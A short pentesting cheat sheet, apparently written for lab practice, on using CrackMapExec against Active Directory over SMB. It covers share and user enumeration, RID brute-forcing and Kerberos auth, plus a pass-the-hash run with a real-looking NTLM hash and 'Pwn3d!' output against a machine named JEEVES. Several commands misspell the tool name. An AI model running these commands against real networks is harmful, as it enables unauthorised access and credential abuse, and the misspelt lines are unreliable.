What is crackmapexec?

... CrackMapExec (CME) is a powerful post-exploitation tool used by red teamers and pentesters to enumerate, audit, and attack Active Directory environments over SMB, RDP, WinRM, and more.

Real Case

Enumerate shares

crackmapexec smb IP (-u 'guest' -p '') --shares

Enumerate DOMAIN users - little deeper

crackmapecec smb IP -u username -p 'password' --users

Enumerate users on the machine with RID

crackmapecec smb IP -u username -p 'password' --rid-brute
  • You can see badpwdcount and desc.

Check valid user with local auth

crackmapecec smb IP -u username -p 'password' --local-auth

Pass the Hash

crackmapexec smb 10.129.228.112 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)

Kerberos authentication

crackmapexec smb $IP -u user -p 'pass' -k
